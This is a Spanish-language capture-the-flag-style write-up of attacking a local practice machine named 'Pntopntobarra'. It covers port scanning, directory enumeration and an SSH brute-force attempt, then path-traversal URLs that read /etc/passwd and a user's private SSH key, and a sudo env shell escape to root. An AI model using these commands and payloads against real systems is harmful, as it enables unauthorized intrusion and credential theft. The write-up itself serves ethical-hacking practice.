# 📘 Informe de Pentesting – Máquina *Pntopntobarra*

* **Dificultad:** Fácil
* **Objetivo:** Obtener acceso root en la máquina
* **Descripción:** Máquina vulnerable desplegada en entorno local para prácticas de hacking ético.

![Logo](/Pntopntobarra/Imagenes/Logo.png)

---

## 🧱 Despliegue de la Máquina

La máquina fue descargada como archivo comprimido. Se utilizó el siguiente comando para descomprimirla:

```bash
unzip paradise.zip
```

Luego, se desplegó la máquina con el script de automatización proporcionado:

```bash
sudo bash auto_deploy.sh pntopntobarra.tar
```

![Despliegue](/Pntopntobarra/Imagenes/Despliegue.jpeg)

---

## 📡 Verificación de Conectividad

Para comprobar que la máquina está activa, se utilizó el comando `ping`:

```bash
ping -c 4 172.17.0.2
```

![Ping](/Pntopntobarra/Imagenes/Ping.jpeg)

---

## 🔍 Reconocimiento de Puertos

Se ejecutó un escaneo completo de puertos con `nmap` para identificar servicios expuestos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Se encontraron abiertos los puertos **22 (SSH)** y **80 (HTTP)**.

![Puertos](/Pntopntobarra/Imagenes/Puertos.jpeg)

Luego, con mi script `extractPorts`, extraje los puertos relevantes y realicé un escaneo más profundo para conocer los servicios y versiones:

```bash
nmap -sC -sV -p 22,80,139,445 172.17.0.2 -oN target.txt
```

![Servicios](/Pntopntobarra/Imagenes/Servicios.jpeg)

---

## 🌐 Análisis del Sitio Web (Puerto 80)

Al ingresar a la página web en el puerto 80, se muestra un mensaje alarmante simulando un ataque o virus, como una técnica de **ingeniería social** para asustar al usuario.

![Página Principal](/Pntopntobarra/Imagenes/Pagina.jpeg)

Esta página continúa mostrando una simulación de eliminación de archivos del sistema.

![Advertencia rm -rf](/Pntopntobarra/Imagenes/Advertenciarm.jpeg)

---

## 📁 Enumeración de Directorios Web

Se utilizó `gobuster` para buscar directorios y archivos ocultos en el servidor web:

```bash
gobuster dir -u http://172.17.0.2/ \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-t 20 -add-slash -b 403,404 -x .php,.html,.txt
```

![Gobuster](/Pntopntobarra/Imagenes/Gobuster.jpeg)

No se encontraron nuevos archivos útiles directamente, pero la exploración llevó a `ejemplos.php`.

---

## 🔐 Ataque de Fuerza Bruta SSH (sin éxito)

Intenté un ataque de fuerza bruta al servicio SSH con `hydra`, utilizando un usuario sospechoso (`nico`) y el diccionario `rockyou.txt`, pero no tuvo éxito:

```bash
hydra -l nico -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 20
```

![Hydra](/Pntopntobarra/Imagenes/Hydra.jpeg)

---

## 🐚 Vulnerabilidad LFI (Local File Inclusion)

En `ejemplos.php` se detectó un parámetro vulnerable `images=` que permitía la inclusión de archivos del sistema mediante rutas relativas. Se probó con:

```http
http://172.17.0.2/ejemplos.php?images=../../../../etc/passwd
```

Esto confirmó una **vulnerabilidad LFI**, mostrando el contenido del archivo `/etc/passwd`, incluyendo usuarios como `nico` y `root`.

![LFI detectado](/Pntopntobarra/Imagenes/Vulnerabilidad.jpeg)

---

## 🔑 Obtención de la Clave Privada SSH

Aprovechando el LFI, accedí al archivo de clave privada del usuario `nico`:

```http
http://172.17.0.2/ejemplos.php?images=../../../../home/nico/.ssh/id_rsa
```

![Clave SSH en la web](/Pntopntobarra/Imagenes/codigo.jpeg)

Se copió todo el contenido de la clave sin añadir espacios innecesarios:

```bash
nano id_rsa
chmod 600 id_rsa
```

![Clave Copiada](/Pntopntobarra/Imagenes/Key.jpeg)

Se intentó el acceso por SSH usando esta clave:

```bash
ssh -i id_rsa nico@172.17.0.2
```

¡Acceso exitoso como usuario *nico*!

![Acceso SSH](/Pntopntobarra/Imagenes/SSH.jpeg)

---

## 🚀 Escalada de Privilegios

Con el comando `sudo -l` verifiqué qué comandos podían ejecutarse como root. Se reveló que se puede usar `/bin/env` con privilegios elevados:

```bash
sudo -l
```

El binario `env` puede ejecutarse como root, lo que permite invocar una shell directamente:

```bash
sudo /bin/env /bin/bash
```

Esto concede acceso a una shell **como usuario root**.

![Acceso root](/Pntopntobarra/Imagenes/root.jpeg)

---

## 🏁 Conclusión

La máquina *Pntopntobarra* presenta una secuencia clara de vectores de ataque:

1. LFI que expone archivos internos.
2. Acceso a la clave privada de SSH.
3. Escalada de privilegios mediante un binario mal configurado (`env`).

Este escenario es ideal para principiantes, ya que permite practicar reconocimiento, explotación web, obtención de credenciales y escalada de privilegios de forma guiada y realista.
